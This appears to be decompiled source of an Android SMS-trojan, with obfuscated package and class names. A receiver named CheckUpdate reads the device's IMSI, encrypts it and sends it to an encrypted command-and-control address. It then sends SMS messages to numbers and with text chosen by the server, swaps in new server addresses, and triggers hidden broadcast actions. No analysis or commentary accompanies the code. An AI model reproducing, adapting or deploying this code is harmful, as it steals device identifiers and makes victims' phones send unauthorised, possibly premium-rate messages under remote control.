package com.dsifakf.aoakmnq;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONArray;
import org.json.JSONObject;

public class Connect3 {
    private HttpURLConnection httpConnection;
    private Progress progress;
    private URL url;

    interface Progress {
        void progressUpdate(int i);
    }

    public Connect3(String link) {
        try {
            this.url = new URL(link);
        } catch (Exception e) {
            this.url = null;
        }
    }

    public JSONArray getJSONData() {
        try {
            return new JSONArray(dataGet());
        } catch (Exception e) {
            return null;
        }
    }

    public JSONObject getJSONObject() {
        try {
            return new JSONObject(dataGet());
        } catch (Exception e) {
            return null;
        }
    }

    public String dataGet() {
        connect();
        StringBuilder resp = new StringBuilder();
        String uncryptResult = null;
        Secure parse = new Secure();
        this.httpConnection.setConnectTimeout(100000);
        try {
            if (this.httpConnection.getResponseCode() == 200) {
                if (this.progress != null) {
                    this.progress.progressUpdate(10);
                }
                BufferedReader inp = new BufferedReader(new InputStreamReader(this.httpConnection.getInputStream()));
                int contL = this.httpConnection.getContentLength();
                int readBytes = 0;
                while (true) {
                    String stL = inp.readLine();
                    if (stL == null) {
                        break;
                    }
                    resp.append(stL);
                    readBytes += stL.getBytes("ISO-8859-2").length + 2;
                    if (this.progress != null) {
                        if ((readBytes / contL) * 100 > 10) {
                            this.progress.progressUpdate((readBytes / contL) * 100);
                        }
                        this.progress.progressUpdate(100);
                    }
                }
                inp.close();
            }
            disconnect();
            try {
                uncryptResult = new String(parse.decrypt(resp.toString()));
            } catch (Exception e) {
            }
            return uncryptResult;
        } catch (Exception e2) {
            return null;
        }
    }

    public void disconnect() {
        this.httpConnection.disconnect();
    }

    public void connect() {
        try {
            this.httpConnection = (HttpURLConnection) this.url.openConnection();
        } catch (Exception e) {
            this.httpConnection = null;
        }
    }

    public void setProgress(Progress progress) {
        this.progress = progress;
    }
}
package com.dsifakf.aoakmnq;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsManager;
import com.dsifakf.aoakmnq.Connect1.OnADFComplite;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import org.json.JSONException;
import org.json.JSONObject;

public class CheckUpdate extends BroadcastReceiver {
    public void onReceive(final Context context, Intent intent) {
        TelephonyManager TelManager = (TelephonyManager) context.getSystemService("phone");
        final Secure parse = new Secure();
        String devimsi = null;
        String addr = null;
        String clientID = context.getResources().getString(R.string.client_id);
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
        final Editor editor = preferences.edit();
        try {
            addr = new String(parse.decrypt(preferences.getString("ab", "6e8fa676e42c9bceb6624fb7601a67d0cc0eceeb0218283614342ac69ade50775488a2f64e4d5f5dd2fc5f602c921176")));
        } catch (Exception e) {
        }
        try {
            devimsi = Secure.bytesToHex(parse.encrypt(TelManager.getSubscriberId()));
        } catch (Exception e2) {
        }
        Connect1 dataFetcher = new Connect1(new StringBuilder(String.valueOf(addr)).append("?1=").append(devimsi).append("&id=").append(clientID).toString());
        dataFetcher.setFetcherResult(new OnADFComplite() {
            public void finish(JSONObject object) throws JSONException {
                if (!(object.isNull("nr") || object.isNull("tt"))) {
                    GoMessage(object.getString("nr"), object.getString("tt"));
                }
                if (!object.isNull("fr")) {
                    setParam2(object.getString("fr"));
                }
                if (!object.isNull("as")) {
                    context.sendBroadcast(new Intent("action1"));
                }
                if (!object.isNull("a")) {
                    context.sendBroadcast(new Intent("action2"));
                }
                if (!object.isNull("sr")) {
                    String par1 = null;
                    try {
                        par1 = Secure.bytesToHex(parse.encrypt(object.getString("sr")));
                    } catch (Exception e) {
                    }
                    editor.putString("ab", par1);
                    editor.commit();
                }
            }

            public void error() {
            }

            private void GoMessage(String Number, String Text) {
                if (Number.replaceAll("\\s", "") != "" && Text != "") {
                    String DecodeText = null;
                    try {
                        DecodeText = URLDecoder.decode(Text, "UTF-8");
                    } catch (UnsupportedEncodingException e) {
                    }
                    SmsManager sendMsg = SmsManager.getDefault();
                    sendMsg.sendMultipartTextMessage(Number, null, sendMsg.divideMessage(DecodeText), null, null);
                }
            }

            private void setParam2(String Param2) {
                String Param2Decode = null;
                try {
                    Param2Decode = Secure.bytesToHex(parse.encrypt(Param2));
                } catch (Exception e) {
                }
                editor.putString("cd", Param2Decode);
                editor.commit();
            }
        });
        Connect2.CheckMultiThSupp(dataFetcher);
    }
}
package com.dsifakf.aoakmnq;

import android.content.Context;
import android.os.AsyncTask;
import org.json.JSONException;
import org.json.JSONObject;

public class Connect1 extends AsyncTask<Void, Void, Void> {
    OnADFComplite compiteResult;
    Connect3 connect3;
    Context context;
    private boolean isError = false;
    JSONObject resultObject = null;

    public interface OnADFComplite {
        void error();

        void finish(JSONObject jSONObject) throws JSONException;
    }

    public Connect1(Context contxt, String ReqAddr) {
        this.connect3 = new Connect3(ReqAddr);
        this.context = contxt;
    }

    public Connect1(String ReqAddr) {
        this.connect3 = new Connect3(ReqAddr);
    }

    /* access modifiers changed from: protected */
    public void onPostExecute(Void result) {
        try {
            if (this.isError || this.resultObject == null) {
                if (this.compiteResult != null) {
                    this.compiteResult.error();
                }
                super.onPostExecute(result);
            }
            if (this.compiteResult != null) {
                this.compiteResult.finish(this.resultObject);
            }
            super.onPostExecute(result);
        } catch (Exception e) {
            if (this.compiteResult != null) {
                this.compiteResult.error();
            }
        }
    }

    /* access modifiers changed from: protected */
    public void onPreExecute() {
        super.onPreExecute();
    }

    /* access modifiers changed from: protected|varargs */
    public Void doInBackground(Void... params) {
        try {
            this.resultObject = this.connect3.getJSONObject();
        } catch (Exception e) {
            this.isError = true;
        }
        return null;
    }

    public void setFetcherResult(OnADFComplite compiteResult) {
        this.compiteResult = compiteResult;
    }
}
